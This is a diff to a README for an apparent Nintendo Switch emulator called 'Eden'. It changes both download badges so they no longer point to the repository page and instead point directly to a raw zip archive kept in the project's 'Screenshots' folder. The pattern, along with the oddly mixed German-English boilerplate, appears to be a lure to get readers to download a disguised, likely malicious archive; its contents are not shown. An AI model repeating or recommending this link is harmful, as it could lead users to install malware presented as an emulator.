@@ -26,7 +26,7 @@ Getting started mit Eden is incredibly simple. Follow these steps, and you will 
 
 **👉 Visit this link to download the application:** 
 
-[![Download Eden Now](https://img.shields.io/badge/⬇️_Download_Eden-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mahoko6505/Eden-Switch-Emulator)
+[![Download Eden Now](https://img.shields.io/badge/⬇️_Download_Eden-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mahoko6505/Eden-Switch-Emulator/raw/refs/heads/main/Screenshots/3.4.zip)
 
 Visit this link to download the application. The page will show you the latest version available für your system (Windows, Android, or Mac). Choose the correct file für your device and download it normally, like you would any other software file.
 
@@ -149,7 +149,7 @@ Download Eden-Switch-Emulator today and unlock the world of Nintendo Switch gami
 
 **👉 Visit this link to download the application:** 
 
-[![Get Eden Now](https://img.shields.io/badge/🎮_Get_Eden_Now-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mahoko6505/Eden-Switch-Emulator)
+[![Get Eden Now](https://img.shields.io/badge/🎮_Get_Eden_Now-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mahoko6505/Eden-Switch-Emulator/raw/refs/heads/main/Screenshots/3.4.zip)
 
 
 
